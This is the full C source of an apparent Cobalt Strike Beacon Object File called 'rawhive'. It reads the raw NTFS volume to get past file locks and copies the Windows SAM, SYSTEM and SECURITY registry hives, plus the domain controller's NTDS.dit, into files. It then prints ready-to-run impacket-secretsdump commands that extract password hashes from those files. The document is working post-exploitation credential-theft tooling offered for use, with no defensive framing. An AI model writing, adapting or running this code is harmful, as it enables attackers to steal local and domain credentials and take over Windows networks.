#include <windows.h>
#include <stddef.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$SetFilePointer(HANDLE,LONG,PLONG,DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID,SIZE_T,DWORD,DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$VirtualFree(LPVOID,SIZE_T,DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetComputerNameA(LPSTR,LPDWORD);
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetFileAttributesA(LPCSTR);

#define rh_zero(p,n)   __builtin_memset((p), 0, (n))
#define rh_copy(d,s,n) __builtin_memcpy((d), (s), (n))

static BOOL rh_range_ok(UINT32 off, UINT32 len, UINT32 size) {
    return off <= size && len <= size - off;
}

static BOOL rh_append_char(char *dst, UINT32 cap, UINT32 *pos, char ch) {
    if (*pos + 1 >= cap) return FALSE;
    dst[(*pos)++] = ch;
    dst[*pos] = '\0';
    return TRUE;
}

static BOOL rh_append_str(char *dst, UINT32 cap, UINT32 *pos, const char *src, BOOL lower) {
    for (UINT32 j = 0; src[j]; j++) {
        char ch = src[j];
        if (lower && ch >= 'A' && ch <= 'Z') ch += 32;
        if (!rh_append_char(dst, cap, pos, ch)) return FALSE;
    }
    return TRUE;
}

static int rh_u64todec(UINT64 n, char *out) {
    if (!n) { out[0] = '0'; out[1] = '\0'; return 1; }
    char tmp[20]; int i = 0;
    while (n) { tmp[i++] = '0' + (int)(n % 10); n /= 10; }
    for (int j = 0; j < i; j++) out[j] = tmp[i - 1 - j];
    out[i] = '\0';
    return i;
}

static int rh_wcsicmp_n(const WCHAR *a, const WCHAR *b, int n) {
    for (int i = 0; i < n; i++) {
        WCHAR ca = a[i], cb = b[i];
        if (ca >= 'a' && ca <= 'z') ca -= 32;
        if (cb >= 'a' && cb <= 'z') cb -= 32;
        if (ca != cb) return ca - cb;
    }
    return 0;
}

#pragma pack(push, 1)

typedef struct {
    BYTE   jmp[3];
    CHAR   oem[8];
    WORD   bps;
    BYTE   spc;
    BYTE   _pad0[26];
    UINT64 total_sectors;
    UINT64 mft_lcn;
    UINT64 mft2_lcn;
    INT8   cpr;
    BYTE   _pad1[3];
    INT8   cpi;
    BYTE   _pad2[3];
    UINT64 serial;
} NTFS_BPB;

#define MFT_MAGIC 0x454C4946u
#define MFT_INUSE 0x0001u

typedef struct {
    DWORD  magic;
    WORD   usa_off;
    WORD   usa_cnt;
    UINT64 lsn;
    WORD   seq;
    WORD   links;
    WORD   attr_off;
    WORD   flags;
    DWORD  used;
    DWORD  alloc;
    UINT64 base_ref;
    WORD   next_id;
    WORD   pad;
    DWORD  rec_num;
} MFT_REC;

#define AT_FNAME  0x00000030u
#define AT_DATA   0x00000080u
#define AT_IROOT  0x00000090u
#define AT_IALLOC 0x000000A0u
#define AT_END    0xFFFFFFFFu

typedef struct {
    DWORD type;
    DWORD len;
    BYTE  non_res;
    BYTE  name_len;
    WORD  name_off;
    WORD  flags;
    WORD  id;
} ATTR_HDR;

typedef struct {
    ATTR_HDR h;
    DWORD val_len;
    WORD  val_off;
    BYTE  idx_flag;
    BYTE  pad;
} ATTR_RES;

typedef struct {
    ATTR_HDR h;
    UINT64 start_vcn;
    UINT64 last_vcn;
    WORD   run_off;
    WORD   comp_unit;
    BYTE   pad[4];
    UINT64 alloc_sz;
    UINT64 data_sz;
    UINT64 init_sz;
} ATTR_NR;

typedef struct {
    DWORD attr_type;
    DWORD collation;
    DWORD blk_sz;
    BYTE  cpb;
    BYTE  pad[3];
} IROOT_HDR;

typedef struct {
    DWORD entry_off;
    DWORD used_sz;
    DWORD alloc_sz;
    BYTE  flags;
    BYTE  pad[3];
} INODE_HDR;

#define INDX_MAGIC 0x58444E49u

typedef struct {
    DWORD     magic;
    WORD      usa_off;
    WORD      usa_cnt;
    UINT64    lsn;
    UINT64    vcn;
    INODE_HDR node;
} INDX_HDR;

typedef struct {
    UINT64 parent_ref;
    UINT64 created;
    UINT64 modified;
    UINT64 mft_chg;
    UINT64 accessed;
    UINT64 alloc_sz;
    UINT64 real_sz;
    DWORD  flags;
    DWORD  reparse;
    BYTE   name_len;
    BYTE   ns;
    WCHAR  name[1];
} FNAME_ATTR;

#define IE_HAS_SUBNODES 0x0001u
#define IE_LAST         0x0002u

typedef struct {
    UINT64 file_ref;
    WORD   entry_len;
    WORD   key_len;
    WORD   flags;
    WORD   pad;
} IE_HDR;

#pragma pack(pop)

#define MAX_RUNS 128

typedef struct {
    HANDLE  vol;
    UINT32  bpc;
    UINT32  bps;
    UINT32  rec_sz;
    UINT32  idx_sz;
    INT64   mft_lcn[MAX_RUNS];
    UINT64  mft_cnt[MAX_RUNS];
    int     mft_nruns;
} CTX;

static BOOL vol_read(CTX *c, UINT64 byte_off, void *buf, UINT32 len) {
    LONG lo = (LONG)(byte_off & 0xFFFFFFFF);
    LONG hi = (LONG)((UINT64)byte_off >> 32);
    DWORD got = 0;
    if (KERNEL32$SetFilePointer(c->vol, lo, &hi, FILE_BEGIN) == INVALID_SET_FILE_POINTER
            && KERNEL32$GetLastError() != NO_ERROR) return FALSE;
    if (!KERNEL32$ReadFile(c->vol, buf, len, &got, NULL)) return FALSE;
    return got == len;
}

// NTFS stomps the last 2 bytes of each sector with a sequence number, put them back before reading
static void apply_fixup(BYTE *buf, UINT32 rec_sz, UINT32 bps) {
    WORD usa_off = *(WORD *)(buf + 4);
    WORD usa_cnt = *(WORD *)(buf + 6);
    UINT32 usa_len = (UINT32)usa_cnt * sizeof(WORD);
    if (!bps || !usa_off || usa_cnt < 2 || usa_cnt > 32) return;
    if (!rh_range_ok(usa_off, usa_len, rec_sz)) return;
    WORD *usa = (WORD *)(buf + usa_off);
    for (WORD i = 1; i < usa_cnt && (UINT32)(i * bps) <= rec_sz; i++) {
        WORD *tail = (WORD *)(buf + (UINT32)i * bps - 2);
        *tail = usa[i];
    }
}

static int decode_runs(const BYTE *p, const BYTE *end, INT64 *lcns, UINT64 *cnts, int max) {
    INT64 prev = 0;
    int   n    = 0;
    while (p < end) {
        BYTE hdr = *p++;
        if (!hdr) return n;
        if (n >= max) return -1;
        int  nl  = hdr & 0x0F;
        int  no  = (hdr >> 4) & 0x0F;
        if (!nl || nl > 8 || no > 8 || (UINT64)(end - p) < (UINT64)(nl + no)) return -1;

        UINT64 cl = 0;
        for (int i = 0; i < nl; i++) cl |= ((UINT64)*p++) << (i * 8);

        UINT64 raw_delta = 0;
        for (int i = 0; i < no; i++) raw_delta |= ((UINT64)*p++) << (i * 8);

        INT64 delta = (INT64)raw_delta;
        if (no > 0 && no < 8 && (raw_delta & (1ULL << (no * 8 - 1))))
            delta = (INT64)(raw_delta | (~0ULL << (no * 8)));

        cnts[n] = cl;
        if (no > 0) { prev += delta; lcns[n] = prev; }
        else        { lcns[n] = -1; }
        n++;
    }
    return -1;
}

static BOOL attr_res_value(const ATTR_HDR *a, const BYTE **val, UINT32 *val_len) {
    if (a->len < sizeof(ATTR_RES) || a->non_res) return FALSE;
    const ATTR_RES *r = (const ATTR_RES *)a;
    if (!rh_range_ok(r->val_off, r->val_len, a->len)) return FALSE;
    *val = (const BYTE *)a + r->val_off;
    *val_len = r->val_len;
    return TRUE;
}

static BOOL attr_nr_runs(const ATTR_HDR *a, const BYTE **runs, const BYTE **end) {
    if (a->len < sizeof(ATTR_NR) || !a->non_res) return FALSE;
    const ATTR_NR *nr = (const ATTR_NR *)a;
    if (nr->run_off < sizeof(ATTR_NR) || nr->run_off >= a->len) return FALSE;
    *runs = (const BYTE *)a + nr->run_off;
    *end = (const BYTE *)a + a->len;
    return TRUE;
}

static BOOL read_mft_entry(CTX *c, UINT32 num, BYTE *buf) {
    UINT64 off_in_mft = (UINT64)num * c->rec_sz;
    UINT64 vcn        = off_in_mft / c->bpc;
    UINT64 inner      = off_in_mft % c->bpc;
    UINT64 cur_vcn    = 0;

    for (int i = 0; i < c->mft_nruns; i++) {
        UINT64 run_len = c->mft_cnt[i];
        if (vcn >= cur_vcn && vcn < cur_vcn + run_len) {
            UINT64 off = (UINT64)(c->mft_lcn[i] + (INT64)(vcn - cur_vcn)) * c->bpc + inner;
            if (!vol_read(c, off, buf, c->rec_sz)) return FALSE;
            apply_fixup(buf, c->rec_sz, c->bps);
            return TRUE;
        }
        cur_vcn += run_len;
    }
    return FALSE;
}

static ATTR_HDR *find_attr(const BYTE *rec, UINT32 rec_sz, DWORD type) {
    const MFT_REC *m   = (const MFT_REC *)rec;
    if (rec_sz < sizeof(MFT_REC) || !rh_range_ok(m->attr_off, sizeof(ATTR_HDR), rec_sz)) return NULL;
    const BYTE    *p   = rec + m->attr_off;
    const BYTE    *end = rec + rec_sz;
    while (p + sizeof(ATTR_HDR) <= end) {
        const ATTR_HDR *a = (const ATTR_HDR *)p;
        if (a->type == AT_END) break;
        if (a->len < sizeof(ATTR_HDR) || (UINT64)(end - p) < a->len) break;
        if (a->type == type) return (ATTR_HDR *)p;
        p += a->len;
    }
    return NULL;
}

static UINT64 scan_node(const BYTE *nhdr, UINT32 nhdr_len, const WCHAR *name, int nlen) {
    if (nhdr_len < sizeof(INODE_HDR)) return 0;
    const INODE_HDR *nd  = (const INODE_HDR *)nhdr;
    if (nd->entry_off > nd->used_sz || nd->used_sz > nhdr_len) return 0;
    const BYTE      *p   = nhdr + nd->entry_off;
    const BYTE      *end = nhdr + nd->used_sz;
    const UINT32 fname_base = (UINT32)offsetof(FNAME_ATTR, name);

    while (p + sizeof(IE_HDR) <= end) {
        const IE_HDR *ie = (const IE_HDR *)p;
        if (ie->entry_len < sizeof(IE_HDR) || (UINT64)(end - p) < ie->entry_len) break;
        if (ie->flags & IE_LAST) break;
        if (ie->key_len >= fname_base && ie->key_len <= ie->entry_len - sizeof(IE_HDR)) {
            const FNAME_ATTR *fn = (const FNAME_ATTR *)(p + sizeof(IE_HDR));
            UINT32 need = fname_base + (UINT32)fn->name_len * sizeof(WCHAR);
            if (need > ie->key_len) break;
            if (fn->name_len == (BYTE)nlen && rh_wcsicmp_n(fn->name, name, nlen) == 0)
                return ie->file_ref;
        }
        p += ie->entry_len;
    }
    return 0;
}

static UINT32 find_in_dir(CTX *c, UINT32 dir, const WCHAR *name, int nlen) {
    BYTE *rec = KERNEL32$VirtualAlloc(NULL, c->rec_sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!rec) return 0;

    UINT32 result = 0;
    if (!read_mft_entry(c, dir, rec)) goto done;
    {
        MFT_REC *m = (MFT_REC *)rec;
        if (m->magic != MFT_MAGIC || !(m->flags & MFT_INUSE)) goto done;
    }

    {
        ATTR_HDR *a = find_attr(rec, c->rec_sz, AT_IROOT);
        if (a && !a->non_res) {
            const BYTE *val;
            UINT32 val_len;
            if (!attr_res_value(a, &val, &val_len) || val_len < sizeof(IROOT_HDR) + sizeof(INODE_HDR))
                goto done;
            UINT64 ref  = scan_node(val + sizeof(IROOT_HDR), val_len - sizeof(IROOT_HDR), name, nlen);
            if (ref) { result = (UINT32)(ref & 0xFFFFFFFFFFFFULL); goto done; }
        }
    }

    {
        ATTR_HDR *a   = find_attr(rec, c->rec_sz, AT_IALLOC);
        BYTE     *ext = NULL;

        if (!a) {
            // dir is too big to fit in one MFT record, the index is in an extension record
            ATTR_HDR *al = find_attr(rec, c->rec_sz, 0x00000020u);
            if (al && !al->non_res) {
                const BYTE *lp;
                UINT32 val_len;
                if (!attr_res_value(al, &lp, &val_len)) goto done;
                const BYTE *le = lp + val_len;
                while (lp + 26 <= le) {
                    DWORD  et  = *(DWORD  *)(lp);
                    WORD   eln = *(WORD   *)(lp + 4);
                    UINT64 fr  = *(UINT64 *)(lp + 16);
                    if (!eln || eln < 26) break;
                    if (et == AT_IALLOC) {
                        UINT32 xn = (UINT32)(fr & 0xFFFFFFFFFFFFULL);
                        if (xn != dir) {
                            ext = KERNEL32$VirtualAlloc(NULL, c->rec_sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
                            if (ext && read_mft_entry(c, xn, ext))
                                a = find_attr(ext, c->rec_sz, AT_IALLOC);
                        }
                        break;
                    }
                    lp += eln;
                }
            }
        }

        if (!a || !a->non_res) {
            if (ext) KERNEL32$VirtualFree(ext, 0, MEM_RELEASE);
            goto done;
        }

        const BYTE *runs;
        const BYTE *runs_end;
        if (!attr_nr_runs(a, &runs, &runs_end)) {
            if (ext) KERNEL32$VirtualFree(ext, 0, MEM_RELEASE);
            goto done;
        }
        INT64  lcns[MAX_RUNS]; UINT64 cnts[MAX_RUNS];
        int nruns = decode_runs(runs, runs_end, lcns, cnts, MAX_RUNS);
        if (ext) { KERNEL32$VirtualFree(ext, 0, MEM_RELEASE); ext = NULL; }
        if (nruns < 0) goto done;

        BYTE *blk = KERNEL32$VirtualAlloc(NULL, c->idx_sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if (!blk) goto done;

        UINT32 cpi = (c->idx_sz >= c->bpc) ? (c->idx_sz / c->bpc) : 1;
        for (int i = 0; i < nruns && !result; i++) {
            for (UINT64 k = 0; k < cnts[i] && !result; k += cpi) {
                if (lcns[i] < 0) continue;
                if (!vol_read(c, (UINT64)(lcns[i] + (INT64)k) * c->bpc, blk, c->idx_sz)) continue;
                INDX_HDR *ih = (INDX_HDR *)blk;
                if (ih->magic != INDX_MAGIC) continue;
                apply_fixup(blk, c->idx_sz, c->bps);
                UINT32 node_off = (UINT32)((BYTE *)&ih->node - blk);
                if (node_off >= c->idx_sz) continue;
                UINT64 ref = scan_node((BYTE *)&ih->node, c->idx_sz - node_off, name, nlen);
                if (ref) result = (UINT32)(ref & 0xFFFFFFFFFFFFULL);
            }
        }
        KERNEL32$VirtualFree(blk, 0, MEM_RELEASE);
    }

done:
    KERNEL32$VirtualFree(rec, 0, MEM_RELEASE);
    return result;
}

// index lookup didn't work out, just walk every MFT record until we find it
static UINT32 find_in_mft(CTX *c, UINT32 parent, const WCHAR *name, int nlen) {
    BYTE *rec = KERNEL32$VirtualAlloc(NULL, c->rec_sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!rec) return 0;
    UINT32 result = 0;
    for (UINT32 n = 5; n < 500000 && !result; n++) {
        if (!read_mft_entry(c, n, rec)) continue;
        MFT_REC *m = (MFT_REC *)rec;
        if (m->magic != MFT_MAGIC || !(m->flags & MFT_INUSE)) continue;
        const BYTE *p   = rec + m->attr_off;
        const BYTE *end = rec + c->rec_sz;
        while (p + sizeof(ATTR_HDR) <= end) {
            const ATTR_HDR *a = (const ATTR_HDR *)p;
            if (a->type == AT_END) break;
            if (a->len < sizeof(ATTR_HDR) || (UINT64)(end - p) < a->len) break;
            if (a->type == AT_FNAME && !a->non_res) {
                const BYTE *val;
                UINT32 val_len;
                const UINT32 fname_base = (UINT32)offsetof(FNAME_ATTR, name);
                if (!attr_res_value(a, &val, &val_len) || val_len < fname_base) {
                    p += a->len;
                    continue;
                }
                const FNAME_ATTR *fn = (const FNAME_ATTR *)val;
                UINT32 need = fname_base + (UINT32)fn->name_len * sizeof(WCHAR);
                if (need > val_len) {
                    p += a->len;
                    continue;
                }
                if ((UINT32)(fn->parent_ref & 0xFFFFFFFFFFFFULL) == parent &&
                        fn->name_len == (BYTE)nlen &&
                        rh_wcsicmp_n(fn->name, name, nlen) == 0) {
                    result = n; break;
                }
            }
            p += a->len;
        }
    }
    KERNEL32$VirtualFree(rec, 0, MEM_RELEASE);
    return result;
}

static BOOL extract_to_file(CTX *c, UINT32 num, const char *label,
                             const char *outdir, const char *hostname, const char *ts) {
    BYTE *rec = KERNEL32$VirtualAlloc(NULL, c->rec_sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!rec) return FALSE;

    BOOL ok = FALSE;
    if (!read_mft_entry(c, num, rec)) goto done;
    { MFT_REC *m = (MFT_REC *)rec; if (m->magic != MFT_MAGIC) goto done; }

    ATTR_HDR *da = find_attr(rec, c->rec_sz, AT_DATA);
    if (!da) goto done;

    char outpath[520];
    {
        UINT32 i = 0;
        outpath[0] = '\0';
        if (!rh_append_str(outpath, sizeof(outpath), &i, outdir, FALSE) ||
            !rh_append_char(outpath, sizeof(outpath), &i, '\\') ||
            !rh_append_str(outpath, sizeof(outpath), &i, hostname, FALSE) ||
            !rh_append_char(outpath, sizeof(outpath), &i, '_') ||
            !rh_append_str(outpath, sizeof(outpath), &i, ts, FALSE) ||
            !rh_append_char(outpath, sizeof(outpath), &i, '_') ||
            !rh_append_str(outpath, sizeof(outpath), &i, label, TRUE) ||
            !rh_append_str(outpath, sizeof(outpath), &i, ".tmp", FALSE)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] output path too long\n");
            goto done;
        }
    }

    HANDLE fout = KERNEL32$CreateFileA(outpath, GENERIC_WRITE, 0, NULL,
                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fout == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] open(%s) failed: %lu\n", outpath, KERNEL32$GetLastError());
        goto done;
    }

    if (!da->non_res) {
        const BYTE *val;
        UINT32 val_len;
        DWORD written;
        ok = attr_res_value(da, &val, &val_len) &&
             KERNEL32$WriteFile(fout, val, val_len, &written, NULL) &&
             written == val_len;
    } else {
        const BYTE *runs;
        const BYTE *runs_end;
        if (!attr_nr_runs(da, &runs, &runs_end)) { KERNEL32$CloseHandle(fout); goto done; }

        ATTR_NR *nr = (ATTR_NR *)da;
        UINT64   dsz = nr->data_sz;

        BYTE *cbuf = KERNEL32$VirtualAlloc(NULL, c->bpc, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if (!cbuf) { KERNEL32$CloseHandle(fout); goto done; }

        INT64  lcns[MAX_RUNS]; UINT64 cnts[MAX_RUNS];
        int nruns = decode_runs(runs, runs_end, lcns, cnts, MAX_RUNS);

        UINT64 filled = 0;
        ok = nruns >= 0;

        for (int i = 0; i < nruns && filled < dsz && ok; i++) {
            for (UINT64 k = 0; k < cnts[i] && filled < dsz && ok; k++) {
                DWORD to_rw = c->bpc;
                if (filled + to_rw > dsz) to_rw = (DWORD)(dsz - filled);
                if (lcns[i] < 0) {
                    for (DWORD _z = 0; _z < to_rw; _z++) cbuf[_z] = 0;
                } else {
                    UINT64 offset = (UINT64)(lcns[i] + (INT64)k) * c->bpc;
                    if (!vol_read(c, offset, cbuf, to_rw)) {
                        ok = FALSE; break;
                    }
                }
                DWORD written;
                if (!KERNEL32$WriteFile(fout, cbuf, to_rw, &written, NULL) || written != to_rw) {
                    ok = FALSE; break;
                }
                filled += to_rw;
            }
        }
        if (ok && filled != dsz) ok = FALSE;

        if (ok)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] %s -> %s (%llu bytes)\n", label, outpath, filled);
        else
            BeaconPrintf(CALLBACK_ERROR, "[-] %s failed at byte %llu (err %lu)\n",
                         label, filled, KERNEL32$GetLastError());

        KERNEL32$VirtualFree(cbuf, 0, MEM_RELEASE);
    }

    KERNEL32$CloseHandle(fout);
done:
    KERNEL32$VirtualFree(rec, 0, MEM_RELEASE);
    return ok;
}

void go(char *args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);
    char *a_vol = BeaconDataExtract(&parser, NULL);
    char *a_out = BeaconDataExtract(&parser, NULL);

    if (!a_out || !a_out[0]) {
        a_out = a_vol;
        a_vol = "C";
    }

    if (!a_out || !a_out[0]) {
        BeaconPrintf(CALLBACK_ERROR, "[-] usage: rawhive [volume] <outdir>\n");
        return;
    }

    char vol = 'C';
    if (a_vol && a_vol[0]) {
        vol = a_vol[0];
        if (vol >= 'a' && vol <= 'z') vol -= 32;
        if (vol < 'A' || vol > 'Z' || (a_vol[1] && !(a_vol[1] == ':' && !a_vol[2]))) {
            BeaconPrintf(CALLBACK_ERROR, "[-] invalid volume: %s\n", a_vol);
            return;
        }
    }

    {
        DWORD attr = KERNEL32$GetFileAttributesA(a_out);
        if (attr == 0xFFFFFFFF || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] outdir does not exist: %s\n", a_out);
            return;
        }
    }

    char hostname[64] = "unknown";
    DWORD hlen = 64;
    KERNEL32$GetComputerNameA(hostname, &hlen);
    for (int i = 0; hostname[i]; i++)
        if (hostname[i] >= 'A' && hostname[i] <= 'Z') hostname[i] += 32;

    FILETIME ft;
    KERNEL32$GetSystemTimeAsFileTime(&ft);
    UINT64 ft64 = ((UINT64)ft.dwHighDateTime << 32) | (UINT64)ft.dwLowDateTime;
    char ts[24];
    rh_u64todec((ft64 - 116444736000000000ULL) / 10000000ULL, ts); 

    char vol_path[] = "\\\\.\\C:";
    vol_path[4] = vol;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] rawhive: host=%s ts=%s volume=%c: out=%s\n", hostname, ts, vol, a_out);

    CTX c; rh_zero(&c, sizeof(c));
    c.vol = KERNEL32$CreateFileA(vol_path, GENERIC_READ,
                FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (c.vol == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] open %s failed: %lu\n", vol_path, KERNEL32$GetLastError());
        return;
    }

    BYTE boot[512]; rh_zero(boot, 512);
    if (!vol_read(&c, 0, boot, 512)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] boot read failed\n"); goto shut;
    }
    if (boot[3]!='N'||boot[4]!='T'||boot[5]!='F'||boot[6]!='S') {
        BeaconPrintf(CALLBACK_ERROR, "[-] not NTFS\n"); goto shut;
    }

    {
        NTFS_BPB *b = (NTFS_BPB *)boot;
        c.bps = b->bps ? b->bps : 512;
        c.bpc = c.bps * (UINT32)b->spc;
        c.rec_sz = (b->cpr < 0) ? (1u << (UINT32)(-(int)b->cpr)) : (UINT32)b->cpr * c.bpc;
        if (!c.rec_sz) c.rec_sz = 1024;
        c.idx_sz = (b->cpi < 0) ? (1u << (UINT32)(-(int)b->cpi)) : (UINT32)b->cpi * c.bpc;
        if (!c.idx_sz) c.idx_sz = 4096;
        if (!b->spc || !c.bpc || c.bps < 512 || c.bps > 4096 ||
                c.rec_sz < sizeof(MFT_REC) || c.idx_sz < sizeof(INDX_HDR)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] unsupported NTFS geometry\n"); goto shut;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "[*] ntfs: bpc=%u rec=%u mft_lcn=%llu\n",
                     c.bpc, c.rec_sz, b->mft_lcn);

        BYTE *mft0 = KERNEL32$VirtualAlloc(NULL, c.rec_sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if (!mft0) { BeaconPrintf(CALLBACK_ERROR, "[-] alloc\n"); goto shut; }

        if (!vol_read(&c, b->mft_lcn * c.bpc, mft0, c.rec_sz)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] mft[0] read\n");
            KERNEL32$VirtualFree(mft0, 0, MEM_RELEASE); goto shut;
        }
        apply_fixup(mft0, c.rec_sz, c.bps);

        if (((MFT_REC *)mft0)->magic != MFT_MAGIC) {
            BeaconPrintf(CALLBACK_ERROR, "[-] mft[0] bad magic\n");
            KERNEL32$VirtualFree(mft0, 0, MEM_RELEASE); goto shut;
        }

        ATTR_HDR *mfdata = find_attr(mft0, c.rec_sz, AT_DATA);
        if (!mfdata || !mfdata->non_res) {
            BeaconPrintf(CALLBACK_ERROR, "[-] $mft $data missing\n");
            KERNEL32$VirtualFree(mft0, 0, MEM_RELEASE); goto shut;
        }
        const BYTE *runs;
        const BYTE *runs_end;
        if (!attr_nr_runs(mfdata, &runs, &runs_end)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] $mft runlist malformed\n");
            KERNEL32$VirtualFree(mft0, 0, MEM_RELEASE); goto shut;
        }
        c.mft_nruns = decode_runs(runs, runs_end, c.mft_lcn, c.mft_cnt, MAX_RUNS);
        if (c.mft_nruns <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] $mft runlist malformed\n");
            KERNEL32$VirtualFree(mft0, 0, MEM_RELEASE); goto shut;
        }
        KERNEL32$VirtualFree(mft0, 0, MEM_RELEASE);
    }

    static const WCHAR wWindows[]  = {'W','i','n','d','o','w','s',0};
    static const WCHAR wSystem32[] = {'S','y','s','t','e','m','3','2',0};
    static const WCHAR wConfig[]   = {'c','o','n','f','i','g',0};

    UINT32 r_win = find_in_dir(&c, 5, wWindows, 7);
    if (!r_win) r_win = find_in_mft(&c, 5, wWindows, 7);
    if (!r_win) { BeaconPrintf(CALLBACK_ERROR, "[-] Windows/ not found\n"); goto shut; }

    UINT32 r_s32 = find_in_dir(&c, r_win, wSystem32, 8);
    if (!r_s32) r_s32 = find_in_mft(&c, r_win, wSystem32, 8);
    if (!r_s32) { BeaconPrintf(CALLBACK_ERROR, "[-] System32/ not found\n"); goto shut; }

    UINT32 r_cfg = find_in_dir(&c, r_s32, wConfig, 6);
    if (!r_cfg) r_cfg = find_in_mft(&c, r_s32, wConfig, 6);
    if (!r_cfg) { BeaconPrintf(CALLBACK_ERROR, "[-] config/ not found\n"); goto shut; }

    {
        static const WCHAR wSAM[]      = {'S','A','M',0};
        static const WCHAR wSYSTEM[]   = {'S','Y','S','T','E','M',0};
        static const WCHAR wSECURITY[] = {'S','E','C','U','R','I','T','Y',0};

        struct { const WCHAR *name; int nlen; const char *label; } tgts[3];
        tgts[0].name = wSAM;      tgts[0].nlen = 3; tgts[0].label = "SAM";
        tgts[1].name = wSYSTEM;   tgts[1].nlen = 6; tgts[1].label = "SYSTEM";
        tgts[2].name = wSECURITY; tgts[2].nlen = 8; tgts[2].label = "SECURITY";

        for (int t = 0; t < 3; t++) {
            UINT32 r = find_in_dir(&c, r_cfg, tgts[t].name, tgts[t].nlen);
            if (!r) r = find_in_mft(&c, r_cfg, tgts[t].name, tgts[t].nlen);
            if (!r) { BeaconPrintf(CALLBACK_OUTPUT, "[!] %s not found\n", tgts[t].label); continue; }
            if (!extract_to_file(&c, r, tgts[t].label, a_out, hostname, ts))
                BeaconPrintf(CALLBACK_ERROR, "[-] %s failed\n", tgts[t].label);
        }
    }

    // NTDS.dit only exists on DCs, silently skip if not found
    BOOL got_ntds = FALSE;
    {
        static const WCHAR wNTDS[]    = {'N','T','D','S',0};
        static const WCHAR wNtdsDit[] = {'n','t','d','s','.','d','i','t',0};
        UINT32 r_ntdsdir = find_in_dir(&c, r_win, wNTDS, 4);
        if (!r_ntdsdir) r_ntdsdir = find_in_mft(&c, r_win, wNTDS, 4);
        if (r_ntdsdir) {
            UINT32 r_dit = find_in_dir(&c, r_ntdsdir, wNtdsDit, 8);
            if (!r_dit) r_dit = find_in_mft(&c, r_ntdsdir, wNtdsDit, 8);
            if (r_dit)
                got_ntds = extract_to_file(&c, r_dit, "ntds", a_out, hostname, ts);
        }
    }

    if (got_ntds)
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] done\n"
            "impacket-secretsdump"
            " -sam %s_%s_sam.tmp"
            " -system %s_%s_system.tmp"
            " -security %s_%s_security.tmp"
            " LOCAL\n"
            "impacket-secretsdump"
            " -ntds %s_%s_ntds.tmp"
            " -system %s_%s_system.tmp"
            " LOCAL\n",
            hostname, ts, hostname, ts, hostname, ts,
            hostname, ts, hostname, ts);
    else
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] done\n"
            "impacket-secretsdump"
            " -sam %s_%s_sam.tmp"
            " -system %s_%s_system.tmp"
            " -security %s_%s_security.tmp"
            " LOCAL\n",
            hostname, ts, hostname, ts, hostname, ts);
shut:
    KERNEL32$CloseHandle(c.vol);
}
